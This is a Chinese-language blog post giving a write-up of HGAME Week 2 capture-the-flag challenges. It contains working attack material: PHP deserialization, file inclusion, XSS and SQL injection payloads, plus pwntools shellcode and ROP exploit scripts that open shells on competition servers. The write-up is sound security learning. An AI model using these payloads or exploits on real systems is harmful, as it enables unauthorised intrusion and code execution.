<!DOCTYPE html>
<html lang="zh-cn">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>HGAME Week2 Writeup</title>
    <link rel="stylesheet" href="/css/style.css" />
    <link rel="stylesheet" href="/css/fonts.css" />
    
  </head>

  <body>
    <nav>
    <ul class="menu">
      
      <li><a href="/">Home</a></li>
      
      <li><a href="/about/">About</a></li>
      
      <li><a href="/tags/">Tags</a></li>
      
      <li><a href="/index.xml">Subscribe</a></li>
      
    </ul>
    <hr/>
    </nav>

<div class="article-meta">
<h1><span class="title">HGAME Week2 Writeup</span></h1>

<h2 class="date">2018/02/19</h2>
</div>

<main>


<p>这周赶上过年，两整天做不了题，写得比较赶（现在是凌晨五点，失眠……干脆写 wp），见谅。</p>

<h2 id="web">{ Web }</h2>

<h3 id="random-250">Random? [250]</h3>

<p>根据提示，访问 <code>/.random.php.swp</code> 并 <code>vim -r random.php</code> 得到源码。以<code>“unserialize ctf -魔术”</code>为关键词在谷歌搜到<a href="http://lzx.dropsec.xyz/2017/03/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">这篇文章</a>。知识点：PHP 的引用赋值，构造 <code>?emmm=O:4:&quot;emmm&quot;:2:{s:6:&quot;public&quot;;N;s:6:&quot;secret&quot;;R:2;}</code> 即可得到 Flag：hgame{&amp;_Is_wondeRful!@# }</p>

<h3 id="草莓社区-1-100">草莓社区-1 [100]</h3>

<p>随便点一个猫片，发现地址栏为 <code>http://118.25.18.223:10011/show_maopian.php?mao=1.jpg</code>，文件引入很可能不带过滤，则构造 <code>?mao=../flag.php</code> 可得到 <code>flag.php</code> 的内容 <code>PD9waHAKCSRmbGFnPSJoZ2FtZXsjTWEwX3BpNG5faGFPX2s0bl9tYSN9IjsK</code>，解 base64 可得 Flag：hgame{#Ma0_pi4n_haO_k4n_ma# }</p>

<h3 id="草莓社区-2-150">草莓社区-2 [150]</h3>

<p>直接构造 <code>?mao=../flag.php</code> 发现不返回 flag，则用 php 伪协议 <code>php://filter/read=convert.base64-encode/resource=../flag.php</code> 可得到数据 <code>UEQ5d2FIQUtDU1JtYkdGblBTSm9aMkZ0WlhzaGJUUnZYM0JwTkc1ZlEyaGhUMTlvWVc5ZmEyRnVJWDBpT3dvPQ==</code>，解两次 base64（一次是伪协议的）可得 Flag：hgame{!m4o_pi4n_ChaO_hao_kan!}</p>

<h3 id="xss-1-100">xss-1 [100]</h3>

<p>&lt;img src=&ldquo;1&rdquo; onerror=&ldquo;alert`1`&rdquo; /&gt; 可得 Flag：hgame{#X5s_soo00o_e4sy#}</p>

<p>知识点：括号被过滤掉时，可以用 ` 绕过。</p>

<h3 id="xss-2-150">xss-2 [150]</h3>

<p>第一想法是 a&rdquo; autofocus onfocus=&ldquo;alert`1`，没想到在火狐上不能用，换个思路：a&rdquo; src=&ldquo;a&rdquo; onerror=&ldquo;alert`1`&rdquo; type=&ldquo;im&#97;ge 可得 Flag：hgame{#LuCkY_y0u_a1ert_l#}</p>

<p>知识点：
1. autofocus
2. 只有第一个 <code>type</code> 会生效
3. 属性值里 HTML 实体优先解析</p>

<h3 id="最简单的sql题-50">最简单的sql题 [50]</h3>

<p>送分题，万能密码 <code>' or '1'='1</code>，Flag：hgame{@s0ng_fen_ti@}</p>

<h2 id="re">{ Re }</h2>

<h3 id="miaomiaowu-200">miaomiaowu [200]</h3>

<p>观察发现是用 py 写的，而且有 py2exe 字样，找到一个 <code>unpy2exe</code> 工具，得到一个 pyc 文件，再次反编译得到源码，整理后如下：</p>

<pre><code class="language-python"># Embedded file name: fvck.py
import md5
import random
import string

def print_key(arg='1543788'):
    arg = int(arg)
    for i in range(95, int(arg / 2 + 1)):
        if arg % i == 0:
            print(hex(i), ' ')
            return print_key(arg / i)
    print(arg)

def get_md5(arg):
    m = md5.new()
    m.update(arg)
    return m.hexdigest()

def get_base64(arg='Fuck1ng11'):
    # string.oo_0
    _all = list(string.ascii_uppercase + string.ascii_lowercase) + list(string.digits) + ['+', '/']
    bin_ed = [ '{:0&gt;6}'.format(str(bin(_all.index(i))).replace('0b', '')) for i in arg if i != '=' ]
    result = ''
    count = arg.count('=')
    while bin_ed:
        four_letter = ''.join(bin_ed[:4])
        if len(four_letter) % 8 != 0:
            four_letter = four_letter[0:-2 * count]
        o1_o1 = [ four_letter[x:x + 8] for x in [0, 8, 16] ]
        o1_o1 = [ int(x, 2) for x in o1_o1 if x ]
        result += ''.join([ chr(x) for x in o1_o1 ])
        bin_ed = bin_ed[4:]
    return result  # RnVjazFuZzEx,  9 -&gt; 12

if __name__ == '__main__':
    print &quot;Welcome to hammer's miaomiaowu&quot;

    while True:
        print 'Give me your choice:'
        print '1) fuck hammer'
        print '2) hit hammer'
        print '3) save hammer'

        choice = raw_input()

        if choice == '1':
            lll = raw_input('plz input your public key:')
            if lll == '1543788':
                print 'Here is your key:'
                print_key(lll)

        elif choice == '2':
            print 'Hammer was the mouth of the b_all, only issued a &quot;wuwu&quot; voice, but he wrote a figure on the w_all: 1543788'

        elif choice == '3':
            print &quot;You must give me the flag , or you can't save hammer jiejie as your rbq!\n&quot;
            print 'But I must know who are you , give me your key:'
            key = raw_input()

            flag = raw_input('Now , give me your flag:')
            flag_p3 = flag[-4:-1]  # length == 3

            if flag_p3 != key:
                print 'Unknown key!'
                print '(You are taken as an intruder, captured as rbp.)'
                exit()

            get_base64 = open('1.jpeg', 'r')

            get_base64.seek(1024, 0)
            o = get_md5(get_base64.read(1))

            get_base64.seek(512, 1)
            oo = get_md5(get_base64.read(1))

            get_base64.seek(256, 1)
            ooo = get_md5(get_base64.read(1))

            get_base64.seek(128, 1)
            ooo0 = get_md5(get_base64.read(1))

            print 'Pay attention, The program may be abnormal'

            if o != '0d61f8370cad1d412f80b84d143e1257':  # C
                print 'Error flag!'
                print '(You are taken as an intruder, captured as rbp.)'
                exit()

            if oo != 'cfcd208495d565ef66e7dff9f98764da':  # 0
                print 'Error flag!'
                print '(You are taken as an intruder, captured as rbp.)'
                exit()

            if ooo != '8277e0910d750195b448797616e091ad':  # d
                print 'Error flag!'
                print '(You are taken as an intruder, captured as rbp.)'
                exit()

            if ooo0 != 'e4da3b7fbbce2345d7772b0674a318d5':  # 5
                print 'Error flag!'
                print '(You are taken as an intruder, captured as rbp.)'
                exit()

            flag_p2 = o + oo + ooo + ooo0  # C0d5

            flag_p1 = flag[6:15]  # 9, hgame{ Fuck1ng11 _ C0d5 _ orz }

            if unknown_function(flag_p1) != 'RnVjazFuZzEx':
                print 'Error flag5!'
                print '(You are taken as an intruder, captured as rbp.)'
                exit()

            print 'Yeah! You got it!'
            print 'hgame{' + flag_p1 + '_' + flag_p2 + '_' + flag_p3 + '}'
</code></pre>

<h3 id="iccanobif-250">Iccanobif [250]</h3>

<p>照着这里的流程 <a href="https://reverseengineeringtips.blogspot.com/2014/12/unpacking-jar2exe-21-extracting-jar.html?showComment=1480364662658#c447064983483780468">https://reverseengineeringtips.blogspot.com/2014/12/unpacking-jar2exe-21-extracting-jar.html?showComment=1480364662658#c447064983483780468</a> 把 jar 提取出来：</p>

<p><img src="re3.png" alt="re3" /></p>

<p>逆操作：</p>

<pre><code class="language-python">skey = [ord(i) for i in &quot;ainvzhuangaishenghuo&quot;]  # 0 - 19
cipher = [9, 14, 15, 27, 31, 19, 27, 23, 20, 15, 20, 8, 29, 15, 58, 20, 15, 13, 27, 48, 9, 8, 1, 41, 13, 9, 27, 28]

flag = list(&quot;x&quot; * 28)

for n, i in enumerate(flag):
    flag[n] = chr(cipher[n] ^ skey[n % 20])

print(''.join(flag))
</code></pre>

<h2 id="pwn">{ Pwn }</h2>

<h3 id="ez-shellcode-100">ez_shellcode [100]</h3>

<p>直接拿 pwntools 里现成的：</p>

<pre><code class="language-python">from pwn import *
conn = remote(&quot;111.230.149.72&quot;, 10004)
conn.recvuntil('&gt; ', drop=True)
conn.sendline(asm(shellcraft.i386.linux.sh(), arch='i386'))
conn.interactive()
</code></pre>

<h3 id="ez-bash-jail-100">ez bash jail [100]</h3>

<p>胡乱试出来的，输入 <code>$0</code> 后即可直接 <code>cat flag</code>。至于为什么可以，还没时间细究。</p>

<h3 id="hacker-system-ver1-100">hacker_system_ver1 [100]</h3>

<p>应该属于入门级别的 ROP？</p>

<pre><code class="language-python">from pwn import *

conn = remote('111.230.149.72', 10005)
file = ELF('./hacker_system_ver1')

puts = file.plt['puts']
start_main_got = file.got['__libc_start_main']
main = 0x08048C1D  # file.symbols['main']

payload = '@'*64 + p32(puts) + p32(main) + p32(start_main_got)

conn.sendlineafter('&gt; ', '3')
conn.sendlineafter('length:', '100')
conn.sendlineafter('name:', payload)

conn.recvuntil('not find!!\n', drop=True)
start_main = u32(conn.recv(4))

print('[@] __libc_start_main address: ' + hex(start_main))

str_bin_sh_offset = 0x15902b - 0x18540
system_offset  = 0x3A940 - 0x18540

payload = '@'*64 + p32(start_main + system_offset) + p32(0xdeadbeef) + p32(start_main + str_bin_sh_offset)

conn.sendlineafter('&gt; ', '3')
conn.sendlineafter('length:', '100')
conn.sendlineafter('name:', payload)

conn.interactive()
</code></pre>

<h2 id="misc">{ Misc }</h2>

<h3 id="咻咻咻-200">咻咻咻 [200]</h3>

<p>”锁没上好“，伪加密，用 ZipCenOp.jar 处理掉伪加密后得到音频文件。用 Adobe Audition 打开，放大后发现音频前方有一些可能代表二进制的数据，用 <a href="https://github.com/ragibson/Steganography">https://github.com/ragibson/Steganography</a> 这个工具得到 <code>aGdhbWV7aDRwcHlfeGl1X1hpdV94eHh4aVVVfQ==</code>，解密可得 <code>hgame{h4ppy_xiu_Xiu_xxxxiUU}</code></p>

<h3 id="white-cosmos-150">White cosmos [150]</h3>

<p>解压得到由 tab 跟空格组成的文件，共 223 个字符，应该不是二进制，考虑是摩尔斯电码。如果 tab 为 - 而空格为 , 则可逐步恢复得到 6867616d657b57656c63306d655f325f57684974655f73703463657d，s.decode(&lsquo;hex&rsquo;) 即可得到 hgame{Welc0me_2_WhIte_sp4ce}</p>

<p>所用网站：<a href="http://www.atool.org/morse.php">http://www.atool.org/morse.php</a> 不知道是不是网站的 bug，后边很多零，反正我手动逐步删除前边几个字符便可逐步得到上边的完整密文。</p>

<h3 id="easy-password-150">easy password [150]</h3>

<p>既然给了提示，直接暴力解题：</p>

<p><img src="misc3.png" alt="misc3" /></p>

<h2 id="crypto">{ Crypto }</h2>

<h3 id="easy-rsa-150">easy rsa [150]</h3>

<p>因为 <code>r = pq - (p+q) + 1</code> 已知，又根据 <code>ed = 1 (mod r)</code> 可求 d，知道 d 后直接解密即可。</p>

<pre><code class="language-python">def ext_Euclid(n, m):
    # 这个函数代码网上找来的，懒得写咯
    if (m == 0):
        return 1, 0
    else:
        x, y = ext_Euclid(m, n%m)
        x, y = y, (x - (n/m) * y)
        return x, y

d = ext_Euclid(e, r)  # 求得初值为负数，+ r 即可
</code></pre>

<h3 id="the-same-simple-rsa-150">The same simple RSA [150]</h3>

<p>公钥只有 256 位，直接拿去 <a href="http://factordb.com/">http://factordb.com/</a> 分解得到 p，q。</p>

<h3 id="caesar-caesar-200">Caesar&amp;&amp;Caesar [200]</h3>

<p>写了一小段代码：</p>

<pre><code class="language-python">cipher = '...(cipher)...'.split()

n = 0
d = {}
dis = []

for i in cipher:
    n += len(i)
    if i in d:
        dis.append((n - d[i], i))
    d[i] = n

# 得到：
# [(28, 'sw'), (259, 'hal'), (231, 'phw'), (224, 'tb'), (210, 'ktz'), (28, 'tb'), (343, 'o'), (14, 'cy'), (63, 'o'), (231, 'aar'), (406, 'e'), (413, 'n'), (469, 'vj'), (497, 'alv'), (469, 'sw'), (560, 'ff')]
</code></pre>

<p>稍微分析一下可猜测密钥长度为 7，然后我就扔这里解密了=。=：<a href="https://www.guballa.de/vigenere-solver">https://www.guballa.de/vigenere-solver</a> 密钥为 <code>another</code>，谷歌一下可知道是百年孤独。</p>

<h3 id="violence-200">violence [200]</h3>

<p>因为相同的字母总是会得到相同的密文，把数字转换成正常一点的 <code>zxjfghjfz_hg_gdvfz_d_khg_xm_uhxcfqrf</code> 之后，直接扔 <code>quipquip.com</code> 可得到：<code>sometimes_it_takes_a_bit_of_violence</code></p>

</main>


<div id="disqus_thread"></div>
<script type="text/javascript">

(function() {
  
  
  if (window.location.hostname == "localhost")
    return;

  var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
  var disqus_shortname = 'oyiadin';
  dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>


  <footer>
  <script src="/js/math-code.js"></script>
<script async src="//mathjax.rstudio.com/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script>



  
  <hr/>
  &copy; <a href="https://blog.b1n.top/">oyiadin</a> | <a href="https://github.com/oyiadin">Github</a> | <a href="https://twitter.com/oyiadin">Twitter</a>
  
  </footer>
  </body>
</html>

